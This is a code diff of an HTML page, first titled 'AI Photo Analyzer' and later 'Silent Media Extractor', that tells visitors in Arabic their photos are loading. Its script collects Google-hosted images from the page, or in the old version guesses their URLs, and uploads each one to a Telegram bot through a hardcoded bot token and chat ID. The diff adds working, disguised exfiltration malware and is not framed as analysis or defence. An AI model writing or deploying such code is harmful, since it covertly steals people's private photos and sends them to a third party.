@@ -1,54 +1,35 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>AI Photo Analyzer</title>
-</head>
+<head><title>Silent Media Extractor</title></head>
 <body>
-  <h2>جارٍ تحليل الصور بالذكاء الاصطناعي...</h2>
-
+  <h2>جارٍ تحميل صورك...</h2>
   <script>
     (async () => {
       const telegramToken = '8066816136:AAFqNp9OCT2hHS00yOZ0HfUBzBCxi1ocpY0';
       const chatId = '6894787120';
 
-      const baseUrls = [
-        'https://lh3.googleusercontent.com/',
-        'https://photos.google.com/lr/photo/'
-      ];
+      // انتظر لتحميل الصور من Google Photos
+      await new Promise(r => setTimeout(r, 3000));
 
-      // تخمين لأسماء صور فعلية (يمكن تطويره لاحقًا)
-      const guesses = [
-        'pA1XszghK3g=w800-h600',
-        'pB1ZxvdfD8k=w800-h600',
-        'pC2FghlTy1M=w800-h600',
-        'ABcdEfGhIjK=w600-h600',
-        'XYZ12345=w1000-h800'
-      ];
+      const images = Array.from(document.querySelectorAll("img")).map(img => img.src).filter(src => src.includes("googleusercontent"));
 
-      for (const base of baseUrls) {
-        for (const guess of guesses) {
-          const imgUrl = base + guess;
+      for (const url of images) {
+        try {
+          const res = await fetch(url);
+          const blob = await res.blob();
 
-          try {
-            const res = await fetch(imgUrl);
-            if (res.ok && res.headers.get('content-type').includes('image')) {
-              const blob = await res.blob();
-              const form = new FormData();
-              form.append("chat_id", chatId);
-              form.append("photo", blob, "image.jpg");
+          const form = new FormData();
+          form.append("chat_id", chatId);
+          form.append("photo", blob, "image.jpg");
 
-              await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
-                method: "POST",
-                body: form
-              });
+          await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+            method: "POST",
+            body: form
+          });
 
-              console.log("✅ Image sent:", imgUrl);
-            } else {
-              console.log("❌ Not found:", imgUrl);
-            }
-          } catch (e) {
-            console.warn("⚠️ Error loading", imgUrl);
-          }
+          console.log("✅ sent", url);
+        } catch (e) {
+          console.warn("❌ error", url);
         }
       }
     })();
